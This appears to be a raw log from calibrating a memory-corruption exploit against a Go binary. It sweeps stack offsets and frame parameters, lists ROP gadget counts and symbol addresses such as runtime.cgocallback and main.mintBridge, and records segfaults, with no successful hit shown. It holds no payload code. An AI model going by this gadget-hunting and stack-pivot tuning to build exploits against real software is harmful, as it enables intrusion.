+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 348, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x7292e182bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 352, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 356, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 360, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x7c9f4625bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 364, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x798b8fb34bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 368, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x7e4f0ea31bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 372, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 376, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x7716a9338bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 380, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 384, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x794cb9d36bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 388, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x72318f332bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 392, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 396, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 400, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 404, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x7d4f2212fbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 408, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x794efd136bdb', '0x7b85eff3abdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 412, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 416, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x70e200d32bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 420, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 424, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 428, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 432, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 436, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x795a9af38bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 440, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 444, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 448, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x72576493abdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 452, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x7ee549332bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 456, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x7a561bd39bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 460, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 464, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 468, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 472, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 476, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 480, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 484, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 488, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 492, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 496, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 500, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 504, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 508, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] best = null
+[desmos_g121] no hit in the phase sweep -> holder-frame (dummy) + alignment sweep
+{"pivot_add_poprbp": 56018, "pivot_add_ret": 12, "pop_rax": 1, "guard_movups": 4, "guard_movq0": 3, "xor_xmm": 2834, "ud2": 6, "jmp_ind": 307, "call_ind": 10383}
+mint=ecc320 cgocb=4703c0 g0=1be2bc0 pivot=ed39c0 poprax=ed39d0 guard=ed39e0 ud2=ed39f0
+  ecc320 t main.mintBridge
+  4703c0 t runtime.cgocallback.abi0
+  409fe0 t runtime.cgocallbackg
+  472d00 t runtime.cgocallbackg.abi0
+  40a1a0 t runtime.cgocallbackg1
+  469420 t runtime.cgocallbackg1.func1
+  40a580 t runtime.cgocallbackg1.func2
+  40a520 t runtime.cgocallbackg1.func3
+ 1be2bc0 d runtime.g0
+ 1be31e0 d runtime.m0
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x77a8adc410e7', '0x70ba7eadd0e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x7774048360e7', '0x7ab23ac230e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x7e2ea2139b96', '0x7f794a9500e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x7b931b9d20e7', '0x7e82d357c0e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x790f1147b0e7', '0x72f2075a50e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x79f0c40f40e7', '0x72318bae10e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x7af22f82cb96', '0x720fc81f40e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x7fb6962410e7', '0x7b8604a2bb96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x772eb47bf0e7', '0x7c8d2e231b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x7d800222fb96', '0x71f7dcce90e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 10} -> hits=0/2 exits=[139, 0] rips=['0x7a38931f40e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x7cb4d1e7f0e7', '0x734991136b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 12} -> hits=0/2 exits=[139, 0] rips=['0x7885bdefd0e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x72b1119c30e7', '0x7f909322ab96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 14} -> hits=0/2 exits=[139, 0] rips=['0x7a65269e00e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x7f01ceb32b96', '0x7ba0341f40e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x75223a7c50e7', '0x7e3bb4931b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x783194332b96', '0x777ff63110e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x7db11a65f0e7', '0x7ca1434e40e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x7be2f7f3ab96', '0x7b125f8100e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x759ec564ab96', '0x7ca9b8f32b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x79c32605f0e7', '0x7bdd306360e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x75cf3c25f0e7', '0x7eda5adf40e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x7f6a21b32b96', '0x7783528a40e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 8} -> hits=0/2 exits=[0, 139] rips=['0x78682cd39b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x70bf4167f0e7', '0x70822a5840e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x748eedf34b96', '0x7b15229c00e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 11} -> hits=0/2 exits=[0, 139] rips=['0x7506371150e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x7cb6de6d40e7', '0x7dc75d69f0e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x7f972da1b0e7', '0x7bd71fc950e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 14} -> hits=0/2 exits=[0, 139] rips=['0x7fe72dae10e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x77ad6d76b0e7', '0x789b90cc30e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7d6d056e60e7', '0x7401b7a7e0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 1} -> hits=0/2 exits=[139, 0] rips=['0x784c8e4560e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x79c68a132ba6', '0x7f2b5776f0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x7a9b1b0cf0e7', '0x78919fd37ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x7fa190d3cba6', '0x73a99dabb0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x77db4fd32ba6', '0x7d6b540e00e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x70cc31ff40e7', '0x7aea6a1f40e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x7851b385bba6', '0x726e9d70d0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x762b1d3e80e7', '0x742b8a133ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x7275bfde90e7', '0x75c975d30ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x7a97914700e7', '0x7d3be30850e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x721f1be600e7', '0x79c5ef13bba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x77df612630e7', '0x7aea582760e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x7e1bfbb3bba6', '0x7e3be34cd0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x74ad689de0e7', '0x7a938b9170e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x73640e56d0e7', '0x710f752dc0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x788df75f60e7', '0x7fe041137ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x718df8e150e7', '0x765d10d39ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x77c4ea4f10e7', '0x7aaed90a00e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x706443a1b0e7', '0x7677e6339ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x7820a7b110e7', '0x7c0bf50a40e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x77336cb30ba6', '0x7d0135937ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x7d73e62ba0e7', '0x766cd77980e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x7fd84922fba6', '0x7504f07b50e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x7cb5f347c0e7', '0x718bc844aba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x747f9bcf70e7', '0x747f362580e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x7df631d38ba6', '0x713aabd39ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x7365c16bf0e7', '0x765bc9c3d0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x7f919d7030e7', '0x755db322aba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x7858f9d000e7', '0x7fbd68acc0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x7aa7a6b34ba6', '0x7ae12233bba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x7789cf3000e7', '0x769374130ba6']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[2, 139] rips=['0x76727a333bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 1} -> hits=0/2 exits=[2, 2] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x716d08134bdb', '0x7e6636d31bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 3} -> hits=0/2 exits=[2, 139] rips=['0x7dfdaeb33bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 4} -> hits=0/2 exits=[2, 2] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 5} -> hits=0/2 exits=[0, 139] rips=['0x705e1f02dbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 6} -> hits=0/2 exits=[139, 2] rips=['0x73077582abdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 7} -> hits=0/2 exits=[2, 2] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 8} -> hits=0/2 exits=[2, 2] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 9} -> hits=0/2 exits=[2, 2] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x7958b2138bdb', '0x7974a0132bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 11} -> hits=0/2 exits=[2, 139] rips=['0x71012422abdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 12} -> hits=0/2 exits=[0, 2] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 13} -> hits=0/2 exits=[2, 2] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 14} -> hits=0/2 exits=[139, 2] rips=['0x7caaeaa2ebdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 15} -> hits=0/2 exits=[2, 2] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 0} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 1} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 2} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 3} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 4} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 5} -> hits=0/2 exits=[139, 1] rips=['0x7722ad335bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 6} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 7} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 8} -> hits=0/2 exits=[1, 139] rips=['0x75788a334bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 9} -> hits=0/2 exits=[1, 139] rips=['0x74d414336bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 10} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 11} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 12} -> hits=0/2 exits=[139, 1] rips=['0x704676b36bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 13} -> hits=0/2 exits=[1, 139] rips=['0x727a05827bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 14} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 234, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x70d0a5137bdb', '0x7e38b1938bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x77ec12d3abdb', '0x733461f35bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 1} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 2} -> hits=0/2 exits=[139, 0] rips=['0x72a954b36bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x7f10a6b3bbdb', '0x74edeaa2abdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 4} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 5} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x705309f35bdb', '0x749ec242abdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 7} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 8} -> hits=0/2 exits=[0, 139] rips=['0x75d9a8b30bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 9} -> hits=0/2 exits=[139, 0] rips=['0x791745336bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 10} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 11} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x76e53922bbdb', '0x7583c982ebdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 13} -> hits=0/2 exits=[139, 0] rips=['0x78f883334bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 14} -> hits=0/2 exits=[139, 0] rips=['0x7b7235f36bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 278, "dummy": 15} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 0} -> hits=0/2 exits=[1, 139] rips=['0x7154a4330bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 1} -> hits=0/2 exits=[1, 139] rips=['0x77450b42abdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 2} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 3} -> hits=0/2 exits=[1, 139] rips=['0x79abb9f37bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 4} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 5} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 6} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 7} -> hits=0/2 exits=[139, 1] rips=['0x71915c429bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 8} -> hits=0/2 exits=[139, 1] rips=['0x7c67abd3bbdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 9} -> hits=0/2 exits=[1, 139] rips=['0x7bf41f431bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 10} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 11} -> hits=0/2 exits=[139, 1] rips=['0x7200f9b35bdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 12} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 13} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 14} -> hits=0/2 exits=[139, 1] rips=['0x71278ff2fbdb']
+[recal] {"warmups": 3, "frame32": 3, "drops": 15, "offset": 234, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x72ffb282ebdb', '0x7cdd4b93bbdb']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7a3087933b96', '0x7e0f01535b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x7dc92db35b96', '0x765725d37b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x74fc12d38b96', '0x7ac542330b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x7a7e8762cb96', '0x795c23d33b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x7ce9b8f37b96', '0x7c8c2c72fb96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x76a0f0c28b96', '0x748e1ad2fb96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x75db3512fb96', '0x7f6d3d530b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x7a029bf2fb96', '0x76a88cf33b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x724f2a335b96', '0x70f0f8f33b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x72f02c736b96', '0x7ee62b732b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x732e90d32b96', '0x7a6b5bb38b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x7ddbc0b3ab96', '0x7d532bf30b96']
